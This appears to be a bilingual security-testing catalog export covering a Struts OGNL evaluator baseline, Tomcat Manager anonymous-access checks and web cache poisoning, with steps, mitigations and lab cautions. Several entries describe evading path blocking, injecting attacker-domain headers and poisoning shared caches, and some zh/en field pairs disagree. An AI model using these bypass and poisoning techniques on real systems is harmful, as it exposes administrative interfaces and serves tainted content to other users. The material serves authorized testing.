exploitation.zh: 按第 1 步向本地受限求值器提交 value=%{7*7} 并携带请求 ID；命中判据为结果等于 49 且 static_method_access 与 process_start 均为 false。结果证明 OGNL 求值入口可达，能力标志证明危险边界关闭；两者结合构成配置基线。不要提交清空排除类或替换 MemberAccess 的载荷，能力标志为 true 时立即升级处理并单独取证。
exploitation.en: As in step 1, submit value=%{7*7} to the local restricted evaluator with a request ID; a hit is a result of 49 with static_method_access and process_start both false. The result proves the OGNL evaluation entry is reachable while the capability flags prove dangerous boundaries are closed—together a configuration baseline. Do not submit payloads clearing exclusion classes or replacing MemberAccess; if a capability flag is true, escalate immediately with separate evidence.

mitigation.zh: 升级到 Apache Struts 受支持版本，避免把不可信字符串作为 OGNL 求值，保持成员访问限制、排除类与包设置，并用允许字段的数据绑定。修复后重放第 1 步请求，确认能力标志保持关闭并对异常表达式建立审计。
mitigation.en: Upgrade to supported Apache Struts versions, avoid evaluating untrusted strings as OGNL, keep member-access restrictions, exclusion classes, and package settings, and bind data through allowed fields. After the fix, replay the step-1 request, confirm capability flags stay off, and audit anomalous expressions.

review.reason: qa-final-2026-09 内容质量终审文案修复

name.zh: Tomcat Manager 未授权访问

description.zh: 无凭据请求 Tomcat Manager 端点，验证匿名暴露面：仅接受 401/403/404 为安全基线，200 即管理应用暴露；不尝试任何凭据或部署操作。
description.en: Request the Tomcat Manager endpoint without credentials to verify 401/403/404 exposure and default-credential behavior.

subCategory.zh: 暴露面与 HTTP 攻击

prerequisites.zh: 使用仅含合成应用的 tomcat-lab 容器，并将 HTTP 与 AJP 绑定到本机。
prerequisites.en: Use a tomcat-lab container with synthetic applications and bind HTTP plus AJP to the local host.

prerequisites.zh: 记录 Manager 是否安装、允许来源、认证 Realm 和预期匿名状态。
prerequisites.en: Record whether Manager is installed, allowed sources, authentication realm, and expected anonymous status.

title.zh: Tomcat Manager 匿名访问检查

description.zh: 无凭据请求本地 Manager 根页面，并断言 401、403 或 404，不尝试任何账户。
description.en: Request the local Manager root without credentials and assert 401, 403, or 404 without trying any account.

analysis.zh: 匿名 200 需要进一步确认是否是真实 Manager 和是否提供管理操作；401、403、404 与日志一致时为阴性。本批不尝试凭据、部署、AJP 文件读取、PUT 写入或文件名规避。
analysis.en: Anonymous status 200 requires confirmation that the page is the real Manager and exposes management operations; aligned 401, 403, or 404 is negative. This batch attempts no credentials, deployment, AJP file read, PUT write, or filename evasion.

opsecTips.zh: 不使用用户名、密码、Hydra、WAR、JSP 或 PUT 请求。
opsecTips.en: Use no usernames, passwords, Hydra, WAR, JSP, or PUT requests.

opsecTips.zh: 容器只含合成应用，AJP 配置只读且端口不暴露到外部网络。
opsecTips.en: Keep only synthetic apps in the container, inspect AJP read-only, and expose no AJP port externally.

description.zh: 绕过对 /manager/html 明文封禁：路径编码后由容器解码；返回 401/200 即管理应用暴露。
description.en: Encode the path past plaintext blocking, letting the container decode it; a 401/200 response confirms manager exposure.

description.zh: 绕过仅封 /html 的策略：轮换 text/jmxproxy 管理子端点；返回 401 即暴露。
description.en: Rotate text/jmxproxy sub-endpoints past /html-only blocking; a 401 response confirms exposure.

description.zh: 以服务器状态页确认管理应用整体暴露：低敏感端点常被遗漏放行；返回 401/200 即成功。
description.en: Confirm overall manager exposure via the server status page often left unblocked; a 401/200 response confirms success.

title.zh: 记录 Manager 与 Realm 基线

description.zh: 登记 Manager 安装状态、允许地址、Realm 和匿名预期结果。
description.en: Register Manager installation, allowed addresses, realm, and expected anonymous outcome.

title.zh: 发送匿名 Manager 请求

description.zh: 只请求 localhost /manager/html，并断言 401、403 或 404。
description.en: Request only localhost /manager/html and assert 401, 403, or 404.

title.zh: 关联 Realm 与访问日志

description.zh: 按请求 ID 核对认证挑战、RemoteAddrValve 和实际 Context。
description.en: Correlate authentication challenge, RemoteAddrValve, and actual Context by request ID.

description.zh: 移除 Manager 或限制来源后重放匿名与授权管理员两个对照。
description.en: After removing Manager or restricting sources, replay anonymous and authorized-admin controls.

overview.zh: Tomcat Manager 访问控制边界验证针对 Manager 应用暴露的场景：匿名主体能否进入 /manager/html。验证无凭据请求只接受 401、403 或 404，不尝试任何账户；AJP 与方法策略归工具诊断。
overview.en: The Tomcat Manager access-control boundary validation targets Manager application exposure: can an anonymous principal reach /manager/html? It issues a credential-free request accepting only 401, 403, or 404 and never attempts accounts; AJP and method policy belong to tool diagnostics.

vulnerability.zh: 根因是 Manager 弱认证或暴露到不受信网络、AJP 配置错误或缺省 Servlet 写方法开启等独立问题组合；Manager 页面存在本身不是漏洞，只有未授权管理能力或弱凭据被确认才成立。
vulnerability.en: The root causes are independent issues—weak Manager authentication or untrusted exposure, misconfigured AJP, or default-servlet write methods enabled; the Manager page existing is not itself a vulnerability, only confirmed unauthorized management capability or weak credentials.

exploitation.zh: 按第 1 步对 /manager/html 发起无凭据 GET 并携带请求 ID；命中判据为返回 401、403 或 404，说明 Manager 对匿名主体关闭，构成安全基线。若返回 200 渲染管理页面，说明 Manager 暴露，记录页面特征作为证据；验证过程不尝试用户名、密码、WAR 上传或部署，并要求结果与 Realm、RemoteAddrValve 日志一致。
exploitation.en: As in step 1, issue a credential-free GET to /manager/html with a request ID; a hit is 401, 403, or 404, showing Manager is closed to anonymous principals and forming the baseline. A 200 rendering the management page means exposure—record page characteristics as evidence. Never attempt usernames, passwords, WAR uploads, or deployment during validation, and require consistency with Realm and RemoteAddrValve logs.

mitigation.zh: 删除不需要的 Manager 并限制到管理网段，使用强认证与最小角色；升级 Tomcat，禁用不需要的 AJP 或绑定回环并设置 secretRequired 与随机 secret，保持 DefaultServlet readonly。修复后重放第 1 步请求，确认匿名访问被拒绝。
mitigation.en: Remove unneeded Manager instances and confine them to management segments with strong authentication and minimal roles; upgrade Tomcat, disable unneeded AJP or bind it to loopback with secretRequired and a random secret, and keep DefaultServlet readonly. After the fix, replay the step-1 request and confirm anonymous access is denied.

name.zh: Web 缓存投毒

description.zh: 覆盖 Web 缓存投毒的键差异验证：从缓存命中状态头探测与未键入头识别，到投毒响应注入与 Fat GET 参数扩展，并附缓存键分派变体头清单，用于确认哪些输入会改变缓存内容。
description.en: Covers key-differential validation of web cache poisoning: from cache-hit header probing and unkeyed-input identification through poisoned-response injection and Fat GET parameter expansion, with cache-key dispatch variant header lists, confirming which inputs alter cached content.

subCategory.zh: 缓存键与未键入头投毒

prerequisites.zh: 确认 Web 缓存键与响应变体验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Web Cache-Key and Response-Variant Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

description.zh: 向目标 URL 追加唯一缓存键参数并发送 HEAD 请求，从响应中提取 X-Cache 头以确认响应是否由缓存返回。
description.en: Appends a unique cache-key parameter to the target URL and sends a HEAD request, extracting the X-Cache header to confirm whether the response came from the cache.

description.zh: 注入 X-Forwarded-Host 未键入头并观察响应；响应中的生成链接或重定向指向注入域名，且缓存键未纳入该头，即确认未键入头注入点。
description.en: Inject the unkeyed X-Forwarded-Host header and observe the response; generated links or redirects pointing at the injected domain while the cache key ignores the header confirms an unkeyed injection point.

explanation.zh: 常被用作缓存键但未包含在键中
explanation.en: Describes how the header segment "X-Forwarded-Host" participates in this validation command.

description.zh: 发送携带注入头的原始请求并观察缓存行为；投毒响应被缓存后，不带该头的后续请求返回指向注入域的内容，即确认缓存投毒。
description.en: Send the raw request with the injected header and watch caching; if the poisoned response is cached and later requests without the header receive injected-domain content, cache poisoning is confirmed.

description.zh: 发送 Fat GET 请求观察正文是否参与缓存；后续对同 URL 的普通 GET 返回 q=poisoned 正文，即确认 Fat GET 投毒。
description.en: Send the Fat GET and check whether the body participates in caching; later plain GETs to the same URL returning the q=poisoned body confirm Fat GET poisoning.

explanation.en: Describes how the header segment "Content-Length" participates in this validation command.

analysis.zh: Web 缓存键与响应变体验证只有在唯一标记输入、服务端最终解析结果、服务端日志与可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Web Cache-Key and Response-Variant Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

title.zh: 缓存键分派变体头清单

description.zh: 枚举 X-Forwarded-Host、X-Forwarded-Scheme、X-Original-URL、X-Forwarded-Prefix 四类常被纳入缓存键或影响路由的请求头，用于逐一注入并观察响应差异。
description.en: Lists X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, and X-Forwarded-Prefix headers that are often included in cache keys or affect routing, for one-by-one injection and response-diff observation.

title.zh: 未键入输入的缓存变体验证

wafBypass.command:
GET /cache-fixture?PAYLOADER_CACHE_VARIANT=1 HTTP/1.1
Host: {TARGET}
X-Forwarded-Host: cache-variant.lab.invalid
X-Payloader-Cache-Marker: PAYLOADER_CACHE_VARIANT

description.zh: 将混合的脚本注入与请求走私片段替换为单一缓存变体请求：只比较该无害标记在不同会话和无会话请求中的缓存键、Vary、Age 与响应哈希，不把头部回显直接等同于跨用户污染。
description.en: Replace mixed script-injection and request-smuggling fragments with one cache-variant request. Compare the harmless marker across different-session and no-session requests using cache keys, Vary, Age, and response hashes; do not equate a reflected header with cross-user poisoning.

description.zh: 向目标 URL 追加唯一参数发送 HEAD 请求并提取 X-Cache 头；两次请求出现 MISS 转 HIT 的变化即确认响应经过缓存层，同时锁定适合投毒的共享页面入口。
description.en: Send a HEAD request with a unique cache-buster parameter and read the X-Cache header; a MISS-to-HIT transition proves responses come from a shared cache and identifies the page worth poisoning.

title.zh: 注入未键入头定位投毒点
title.en: Inject unkeyed headers to find the poisoning vector

description.zh: 用第 1 步确认的缓存路径，注入指向攻击者域名的 X-Forwarded-Host 头；响应中的生成链接或重定向跳向注入域名且缓存键未包含该头，即找到可写入缓存的未键入输入。
description.en: Inject X-Forwarded-Host pointing at the attacker domain on the cached path; if generated links or redirects honor the injected host while the cache key ignores the header, the unkeyed input is confirmed.

description.zh: 发送携带注入头的原始 GET 请求让恶意响应写入缓存；随后不带该头的普通请求返回指向攻击者域的内容，即投毒成功，访问同 URL 的所有用户都会收到污染响应。
description.en: Send the crafted GET so the poisoned response is stored, then request the same URL without the header; if ordinary visitors receive attacker-domain content, the shared cache entry is poisoned.

title.zh: 用 Fat GET 扩大投毒面

description.zh: 在 GET 请求中附带 q=poisoned 正文检验正文是否参与缓存判定；普通 GET 返回被篡改的正文即确认第二条投毒路径，可与第 3 步的头注入叠加扩大影响范围。
description.en: Append a q=poisoned body to a GET request to test whether bodies join the cache decision; a tampered response on a plain GET confirms a second poisoning vector that stacks with header injection.

title.en: Bypass key normalization with header variants

description.zh: 当单个头被拦截时，换用 X-Forwarded-Scheme、X-Original-URL、X-Forwarded-Prefix 等变体组合重试投毒；任一变体仍能把恶意内容写入缓存即绕过键归一化。
description.en: If the single header is filtered, retry the poisoning with X-Forwarded-Scheme, X-Original-URL and X-Forwarded-Prefix variants; any variant that still lands in the cache bypasses key normalization.

overview.zh: 该 Payload 覆盖 Web 缓存投毒场景，检验共享缓存的键构造是否遗漏可影响响应内容的输入。验证维度含 X-Cache 命中探测、X-Forwarded-Host 未键入头识别、基础投毒与 Fat GET 参数扩展，对应第 1 至第 4 步。
overview.en: This payload covers web cache poisoning, testing whether the shared cache key omits inputs that influence response content. Validation covers X-Cache hit probing, X-Forwarded-Host unkeyed-header identification, baseline poisoning, and Fat GET parameter extension, mapped to steps 1 through 4.

vulnerability.zh: 根因在于缓存键与源站响应生成所依赖的输入不一致：X-Forwarded-Host 等未键入头能改写生成链接，Fat GET 的正文参数可参与渲染，攻击者注入的值被缓存共享给全部用户。
vulnerability.en: The root cause is divergence between the cache key and the inputs that drive response generation: unkeyed headers such as X-Forwarded-Host rewrite generated links, and Fat GET body parameters join rendering, so attacker-injected values get cached and shared with all users.

exploitation.zh: 第 1 步对目标 URL 追加唯一参数发 HEAD 请求，从 X-Cache 确认缓存行为；第 2 步注入 X-Forwarded-Host，响应内链接指向注入域且键未覆盖即确认未键入头；第 3 步发送带注入头的原始请求，投毒响应被缓存后无头请求同样返回注入内容即确认投毒；第 4 步以 Fat GET 验证正文参数入缓存。占位符在全局变量菜单替换；被拦时参考 wafBypass 变体清单。
exploitation.en: In step 1, send a HEAD with a unique cache parameter and read X-Cache. In step 2, inject X-Forwarded-Host; links pointing at the injected domain with the key ignoring it confirm the unkeyed header. In step 3, send the raw request with the injected header; once cached, header-less requests returning injected content confirm poisoning. In step 4, verify body parameters entering the cache with Fat GET. Replace placeholders via the global variables menu; see wafBypass variant lists if blocked.

mitigation.zh: 把所有影响响应的输入纳入缓存键，禁用或固定派生 Host 类头，拒绝带正文的 GET 请求；对投毒高危路径降低共享缓存寿命。修复后重放第 3、4 步，缓存应保持原响应且无跨用户污染。
mitigation.en: Include every response-affecting input in the cache key, disable or pin derived Host headers, reject GETs with bodies, and shorten shared-cache lifetimes on high-risk paths. After the fix, replay steps 3 and 4: the cache should keep the original response with no cross-user contamination.
